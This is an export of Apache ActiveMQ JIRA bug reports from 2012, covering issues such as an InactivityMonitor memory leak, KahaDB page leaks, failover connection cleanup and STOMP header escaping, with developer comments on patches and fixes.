[1]https://issues.apache.org/jira/secure/attachment/12540464/AMQ-3956.patch
;;;","10/Aug/12 12:35;tabish;Looks good, think you should go ahead and apply it. ;;;","13/Aug/12 07:09;tmielke;Resolved by this [commit|https://fisheye6.atlassian.com/changelog/activemq?cs=1371722].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory leak bacause of InactivityMonitor thread,AMQ-3962,12601450,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,sgri,sgri,04/Aug/12 08:59,08/Sep/12 11:35,14/Jul/23 05:43,08/Sep/12 11:35,5.5.0,5.6.0,,,,5.7.0,,,JMS client,,,,0,,,,,,,,,"When I re-start my web application which connects to a standalone ActiveMQ broker via Tomcat Manager, I got OutOfMemoryError in PermGenSpace. The profiler shows that after stopping the web application it could not be unloaded from memory because of a memory leak caused by InactivityMonitor thread, see the screenshot for detail. ","Ubuntu 12.04 x64
Tomcat 7.0.28
Oracle JDK 1.6.0_32",davsclaus,sgri,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3451,,,,,,,,,,,,,,,,"04/Aug/12 09:02;sgri;memory_leak_inactivity_monitor.png;https://issues.apache.org/jira/secure/attachment/12539146/memory_leak_inactivity_monitor.png","04/Aug/12 09:14;sgri;patch.txt;https://issues.apache.org/jira/secure/attachment/12539147/patch.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249776,,,Fri Sep 07 14:04:18 UTC 2012,,,,,,,,,,,"0|i0ahfj:",59097,,,,,,,,,,,,,,,,,,,,,"04/Aug/12 09:02;sgri;Added a screenshot with profiler.;;;","04/Aug/12 09:14;sgri;Attached a patch.;;;","06/Sep/12 17:58;davsclaus;Sergey, what is ""Tomcat Manager"". Do you mean the web console that Tomcat offers?;;;","06/Sep/12 18:13;sgri;Yes, the Tomcat's web console which is available at http://localhost:8080/manager/html;;;","07/Sep/12 14:04;davsclaus;Okay Sergey the latest fixes are in the code base. Fell free to give the 5.7-SNAPSHOT a try on your end as well.

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable subscriber only receives part of the persisted messages on re-connect,AMQ-3961,12601445,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,andreasmattes,andreasmattes,03/Aug/12 23:56,17/Aug/12 12:48,14/Jul/23 05:43,17/Aug/12 12:48,5.6.0,,,,,5.7.0,,,Connector,,,,0,,,,,,,,,"A durable subscriber is connected to ActiveMQ using the ConnectionConsumer protocol, transacted sessions, and at most 1 message per session. While the subscriber is disconnected, the publisher publishes e.g. 10 messages. When the subscriber re-connects, it only receives 2 messages of those. If it repeatedly disconnects and re-connects, it receives 2 messages each time until all messages are received.

Further investigation reveals that the problem lies in class org.apache.activemq.broker.region.PrefetchSubscription which does not re-check for further pending messages to be dispatched when committed message are removed from the list of dispatched but not yet acknowledged messages.",Default configuraton of ActiveMQ under Linux or Windows,andreasmattes,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Aug/12 14:57;andreasmattes;PrefetchSubscription.patch;https://issues.apache.org/jira/secure/attachment/12540888/PrefetchSubscription.patch","14/Aug/12 14:49;andreasmattes;PrefetchSubscriptionTest.java;https://issues.apache.org/jira/secure/attachment/12540885/PrefetchSubscriptionTest.java","14/Aug/12 14:49;andreasmattes;TestClient.java;https://issues.apache.org/jira/secure/attachment/12540886/TestClient.java",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246248,,,Fri Aug 17 12:48:53 UTC 2012,,,,,,,,,,,"0|i07jaf:",41892,,,,,,,,,,,,,,,,,,,,,"04/Aug/12 00:02;tabish;A good course of action here would be to create a JUnit test case that shows the issue and a patch that resolves it, this will ensure it stays fixed into the future. ;;;","04/Aug/12 00:04;andreasmattes;The attached file ""PrefetchSubscription.patch"" contains a tentative fix for this issue.;;;","04/Aug/12 07:22;andreasmattes;I'll try to create a reasonable unit test, but first I have to do some further investigation in order to emulate environment and communication correctly.;;;","14/Aug/12 14:49;andreasmattes;Find attached the following two tests demonstrating the issue:

# ""PrefetchSubscriptionTest.java"" contains a unit test which re-plays the interaction with the ""DurableTopicSubscription"" which leads to the issue with undispatched messages. Collaborating classes are partly mocked and simplified (e.g. transactions).
# ""TestClient.java"" is implemented as JUnit TestCase, but not a unit test and requires an ActiveMQ server to be running at ""tcp://localhost:61616"". It shows the issue from JMS API level.;;;","17/Aug/12 12:48;tabish;Updated the TestClient test app to a JUnit based test case and applied the fix, good catch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
META-INF/spring.schemas does not contain a reference to 5.6.0 schema,AMQ-3958,12601338,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,ajermakovics,ajermakovics,03/Aug/12 09:45,03/Aug/12 10:12,14/Jul/23 05:43,03/Aug/12 10:12,5.6.0,,,,,5.7.0,,,,,,,0,schema,spring,version,,,,,,"The reference to 5.6.0 schema should also be included in spring.schemas file:

{code}
http\://activemq.apache.org/schema/core/activemq-core-5.6.0.xsd=activemq.xsd
{code}

",,ajermakovics,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249777,,,Fri Aug 03 10:12:01 UTC 2012,,,,,,,,,,,"0|i0ahfr:",59098,,,,,,,,,,,,,,,,,,,,,"03/Aug/12 10:12;gtully;fix in http://svn.apache.org/viewvc?rev=1368861&view=rev

hmm, this has cropped up before: https://issues.apache.org/jira/browse/AMQ-3005

TODO: research a way to append a new version specific instance as part of the release profile.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB pagefile (db.data) steady growth - BTreeIndex page leak,AMQ-3956,12601046,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,01/Aug/12 11:05,07/Mar/14 10:00,14/Jul/23 05:43,01/Aug/12 11:58,5.5.1,5.6.0,,,,5.7.0,,,,,,,0,index,kahadb,leak,,,,,,"There is a page leak in the kahadb BTeeIndex that can result in the pagefile (db.data) growing steadily. One use case that can reproduce is with durable subs that repeatedly subscribe and unsubscribe with pending messages.
The problem can occur with particular usage of any btree index so the problem is not confined to durable subs.",,gtully,lionel.cons,ravisomepalli,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249778,,,Fri Mar 07 10:00:56 UTC 2014,,,,,,,,,,,"0|i0ahfz:",59099,,,,,,,,,,,,,,,,,,,,,"01/Aug/12 11:58;gtully;fix and test in http://svn.apache.org/viewvc?rev=1367924&view=rev;;;","07/Mar/14 00:37;ravisomepalli;We have 5.7.0 and use only persistent queues this issue is failing;;;","07/Mar/14 10:00;gtully;If you can provide a unit test that demos the problem on trunk. Please reopen this issue. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WebSocket Transport - Race condition starting transport,AMQ-3955,12601039,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,01/Aug/12 10:43,01/Aug/12 10:54,14/Jul/23 05:43,01/Aug/12 10:54,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"In the StompServlet, when a websocket request comes in, we are starting up the broker's websocket connection when we call listener.onAccept(socket). 
Under the covers, it begins a task in a new thread to create the connection, instantiate the transport listener, and set the listener on the transport. However, this is done asynchronously, and when the StompServlet calls listener.onAccept(socket), it immediately returns to the underlying jetty websockets implementation, returning the StompSocket (which as the websocket onTextMessage listener). It seems it's possible the jetty code could call back the onTextMessage listener's onMessage(...) method and expect the StompSocket to process the Stomp message before the steps taken to complete creating the connection from the async listener.onAccept(..) call.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249779,,,Wed Aug 01 10:54:33 UTC 2012,,,,,,,,,,,"0|i0ahg7:",59100,,,,,,,,,,,,,,,,,,,,,"01/Aug/12 10:54;dejanb;Fixed with svn revision 1367915

Thanks to Christian Posta for patch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intended delivery mode for JMSUsecaseTest is not tested,AMQ-3954,12600832,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,tabish,ceposta,ceposta,31/Jul/12 12:51,31/Jul/12 15:51,14/Jul/23 05:43,31/Jul/12 15:51,5.6.0,,,,,5.7.0,,,Test Cases,,,,0,,,,,,,,,"The JMSUsecaseTest clearly intends to test non-persistent delivery, but nowhere in the test is it actually doing that. Turn the logging to trace and watch that the messages are always being sent persistent even in the non-peristent tests. ",,ceposta,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Jul/12 12:52;ceposta;Patch_for_AMQ-3954_Intended_delivery_mode_for_JMSUsecaseTest_is_not_tested.patch;https://issues.apache.org/jira/secure/attachment/12538543/Patch_for_AMQ-3954_Intended_delivery_mode_for_JMSUsecaseTest_is_not_tested.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249780,,,Tue Jul 31 15:51:49 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahgf:",59101,,,,,,,,,,,,,,,,,,,,,"31/Jul/12 15:51;tabish;Patch applied, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.util.URISupport.isCompositeURI doesn't work properly.,AMQ-3953,12600744,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mikmela,mikmela,30/Jul/12 22:44,31/Jul/12 15:45,14/Jul/23 05:43,31/Jul/12 15:45,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"URISupport.isCompositeURI(URI uri) is not implemented correctly. It doesn't work for the cases when a scheme part contains ""//"" (double slashes). In the simple test where a failover uri contains two url's:{color:blue} _failover://(tcp://bla:61616,tcp://bla:61617)}_{color} and is the composite URI, URISupport.isCompositeURI(uri) returns false... The general problem is that the definition of a ""composite URI"" is pretty loose and is not defined formally... According to http://activemq.2283324.n4.nabble.com/composite-uri-td4654365.html {quote}uri is composite if the scheme is followed by (..){quote}

Please, find attached unit test patch and, possible fix based on assumption that parentheses is a criteria...  ",,mikmela,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/12 22:56;mikmela;URISupport-patch.txt;https://issues.apache.org/jira/secure/attachment/12538445/URISupport-patch.txt","30/Jul/12 22:46;mikmela;URISupportTest-patch.txt;https://issues.apache.org/jira/secure/attachment/12538444/URISupportTest-patch.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249781,,,Tue Jul 31 15:45:16 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahgn:",59102,,,,,,,,,,,,,,,,,,,,,"30/Jul/12 22:46;mikmela;Unit test patch;;;","31/Jul/12 15:45;tabish;Seems reasonable.  Patch applied.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FailoverTransport never closes backup connections,AMQ-3939,12599809,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ckiernan,ckiernan,23/Jul/12 06:12,07/Aug/12 22:05,14/Jul/23 05:43,24/Jul/12 21:16,5.5.1,5.6.0,,,,5.7.0,,,Transport,,,,0,,,,,,,,,"When creating a FailoverTransport and setting backup=true and randomize=false, the failover transport creates the backup connections as expected but does not close them upon stop().  

The same thing happens with priorityBackup=true.",,ckiernan,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jul/12 06:13;ckiernan;AMQ-3939.patch;https://issues.apache.org/jira/secure/attachment/12537546/AMQ-3939.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249786,,,Tue Aug 07 22:05:20 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahhr:",59107,,,,,,,,,,,,,,,,,,,,,"23/Jul/12 06:13;ckiernan;It's a git diff against trunk, hope that's ok;;;","24/Jul/12 21:16;tabish;Fix applied with thanks. ;;;","07/Aug/12 22:05;tabish;Found an additional case of leakage, fixed now on trunk. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JConsole browse() function does not work if useCache=false,AMQ-3935,12599105,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,17/Jul/12 12:07,17/Jul/12 12:16,14/Jul/23 05:43,17/Jul/12 12:16,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"Doing a send of 20 messages in batches of 10, and a browse in between via jconsole with policy entry useCache=false, the browse does not return 20 messages on the second call.
When a consumer does a browse, because there are some consumers in the mix, a page in occurs. Via jmx, there are no consumers b/c jmx goes direct to the queue via the mbean.
The problem is that the browse does not force a page in from disk. So if the messages are not cached they are not visible.
Ensuring that a browse does page in if the cache is disabled will sort this. ",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249787,,,Tue Jul 17 12:16:36 UTC 2012,,,,,,,,,,,"0|i0ahhz:",59108,,,,,,,,,,,,,,,,,,,,,"17/Jul/12 12:16;gtully;fix in http://svn.apache.org/viewvc?rev=1362462&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
QueueViewMBean.getMessage throws NullPointerException when message not found,AMQ-3934,12599093,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kaaveland,kaaveland,17/Jul/12 09:41,17/Jul/12 13:03,14/Jul/23 05:43,17/Jul/12 13:03,5.6.0,,,,,5.7.0,,,JMX,,,,0,,,,,,,,,"When calling QueueViewMBean.getMessage(String messageID), a NullpointerException is thrown from QueueView.java:40 when the message is not found on the queue. Adding a nullcheck in QueueView.getMessage(String messageID) fixes the issue.",Linux 64-bit.,andreaja,kaaveland,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jul/12 09:41;kaaveland;GetMessageNPETest.java;https://issues.apache.org/jira/secure/attachment/12536795/GetMessageNPETest.java","17/Jul/12 09:42;kaaveland;amqpatch.diff;https://issues.apache.org/jira/secure/attachment/12536796/amqpatch.diff",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249788,,,Tue Jul 17 13:03:43 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahi7:",59109,,,,,,,,,,,,,,,,,,,,,"17/Jul/12 09:41;kaaveland;This unit test demonstrates the issue.;;;","17/Jul/12 09:42;kaaveland;This diff fixes the issue.;;;","17/Jul/12 13:03;tabish;Patch applied with thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"receiveNoWait hangs when broker is down, using failover and prefetch=0",AMQ-3932,12599029,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,amcdonne,amcdonne,16/Jul/12 19:53,20/Jul/12 22:54,14/Jul/23 05:43,20/Jul/12 22:54,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"I have a connection set up using failover and queuePrefetch=0.  I create a consumer, stop the broker, and call receiveNoWait.

I would expect this to return/throw immediately; instead it hangs.  Without failover or with a non-zero prefetch it works as expected.",,amcdonne,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jul/12 19:55;amcdonne;AMQ3932Test.java;https://issues.apache.org/jira/secure/attachment/12536702/AMQ3932Test.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249789,,,Fri Jul 20 22:54:20 UTC 2012,,,,,,,,,,,"0|i0ahif:",59110,,,,,,,,,,,,,,,,,,,,,"16/Jul/12 19:55;amcdonne;Attaching test case, heavily based on test from AMQ-2446.;;;","19/Jul/12 13:11;tabish;It seems valid that in the case where the transport is not connected the receiveNoWait and the timed receive as well should just return null to indicate that there's not currently a message available since in the timed case you could end up waiting much longer than the intended time otherwise.  ;;;","20/Jul/12 22:54;tabish;Fixed in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
DataFileNotDeletedTest.testForDataFileNotDeletedTransacted() fails intermittently,AMQ-3930,12599006,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,16/Jul/12 17:54,01/Nov/12 20:46,14/Jul/23 05:43,01/Nov/12 20:46,,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,"This test will usually pass if you run it individually, and will usually fail if you run the suite.  (which contains only one other test)

I will attach surefire-reports files
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jul/12 17:38;kearls;DataFileNotDeletedTransacted.patch;https://issues.apache.org/jira/secure/attachment/12537716/DataFileNotDeletedTransacted.patch","16/Jul/12 17:58;kearls;TEST-org.apache.activemq.bugs.DataFileNotDeletedTest.xml;https://issues.apache.org/jira/secure/attachment/12536678/TEST-org.apache.activemq.bugs.DataFileNotDeletedTest.xml","16/Jul/12 17:58;kearls;org.apache.activemq.bugs.DataFileNotDeletedTest-output.txt;https://issues.apache.org/jira/secure/attachment/12536676/org.apache.activemq.bugs.DataFileNotDeletedTest-output.txt","16/Jul/12 17:58;kearls;org.apache.activemq.bugs.DataFileNotDeletedTest.txt;https://issues.apache.org/jira/secure/attachment/12536677/org.apache.activemq.bugs.DataFileNotDeletedTest.txt",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253758,,,Thu Nov 01 20:46:21 UTC 2012,,,,,,,,,,,"0|i0e51r:",80580,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"24/Jul/12 12:55;tabish;Can't seem to reproduce this on my hardware.  The test is testing AMQ persistence adapter which is not really recommended anymore.;;;","24/Jul/12 17:36;kearls;It still fails for me, about 1/4 of the time both on my mac and on ubuntu.  Since we don't recommend the persistence adapter anymore should we just mark this test as @Ignore?  

I will attach a patch that does this.
;;;","24/Jul/12 17:38;kearls;Update test to JUnit4 and add @Ignore to testForDataFileNotDeletedTransacted.
;;;","01/Nov/12 20:46;tabish;Applied the patch to disable to failing test, the AMQ and Kaha stores will be deprecated in v5.8;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
STOMP multiple header handling incorrect per the 1.1 spec,AMQ-3929,12598971,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,chirino,chirino,16/Jul/12 14:33,16/Jul/12 15:28,14/Jul/23 05:43,16/Jul/12 15:28,,,,,,5.7.0,,,STOMP,,,,0,,,,,,,,,,,buchi,chirino,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249790,,,Mon Jul 16 15:28:26 UTC 2012,,,,,,,,,,,"0|i0ahin:",59111,,,,,,,,,,,,,,,,,,,,,"16/Jul/12 14:33;chirino;Original reported on the stomp spec mailing lists: https://groups.google.com/d/msg/stomp-spec/jjUuqDoWd6A/t675aApoJikJ;;;","16/Jul/12 14:39;tabish;I wouldn't say its incorrect given that the spec reads, ""The intermediate server MAY 'update' header values by either prepending headers to the message or modifying a header in-place in the message.""  The ""MAY"" in there would indicate that either way is acceptable. ;;;","16/Jul/12 14:48;chirino;The incorrect bit is that it selects the last header as the value instead of using the first header in the header list as the value.;;;","16/Jul/12 14:49;tabish;Gotcha, thanks for clarifying that here in the issue.;;;","16/Jul/12 15:28;tabish;Fix and test case applied in trunk. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
message-id colons are inconsistently escaped  ,AMQ-3928,12598922,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,holla2040,holla2040,16/Jul/12 06:49,16/Jul/12 13:55,14/Jul/23 05:43,16/Jul/12 13:55,5.7.0,,,,,,,,STOMP,,,,0,,,,,,,,,"stomp version 1.0 and 1.1 have different ':' escaping for the message-id header.

------------------
here's 1.0 example

holla@knopfler[513]: nc eric 61613
CONNECT
accept-version:1.0
heart-beat:0,0

^@
CONNECTED
heart-beat:0,0
session:ID:eric-51104-1342368411805-2:20
server:ActiveMQ/5.7-SNAPSHOT
version:1.0


SUBSCRIBE
destination:/queue/foo

^@
MESSAGE
message-id:ID:eric-51104-1342368411805-4:5:1:1:8
type:
destination:/queue/foo
timestamp:1342420889593
expires:0
priority:0
correlation-id:

Enter some text here for the message body...
^\Quit

----------------------
here's 1.1 example

holla@knopfler[514]: nc eric 61613
CONNECT
accept-version:1.1
heart-beat:0,0

^@
CONNECTED
heart-beat:0,0
session:ID:eric-51104-1342368411805-2:21
server:ActiveMQ/5.7-SNAPSHOT
version:1.1


SUBSCRIBE
id:112233
destination:/queue/foo

^@
MESSAGE
message-id:ID\ceric-51104-1342368411805-4\c5\c1\c1\c9
type:
destination:/queue/foo
timestamp:1342421009684
expires:0
subscription:112233
priority:0
correlation-id:

Enter some text here for the message body...
^\Quit


summary

v1.0
MESSAGE
message-id:ID:eric-51104-1342368411805-4:5:1:1:8

v1.1
MESSAGE
message-id:ID\ceric-51104-1342368411805-4\c5\c1\c1\c9


I don't know if ':' chars in all stomp headers/properties are supposed to escaped. in version 1.1, session and message-id are also escaped inconsistently. Shown here

...
session:ID:eric-51104-1342368411805-2:21
...
message-id:ID\ceric-51104-1342368411805-4\c5\c1\c1\c9
","ubuntu 10.04 32bit java version ""1.6.0_24"" OpenJDK",holla2040,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,293791,,,Mon Jul 16 13:55:55 UTC 2012,,,,,,,,,,,"0|i0tsbj:",171897,,,,,,,,,,,,,,,,,,,,,"16/Jul/12 10:07;tabish;This is working as it should be the Stomp v1.1 spec requires the escaping while the Stomp v1.0 spec does not.  See:

http://stomp.github.com/stomp-specification-1.0.html
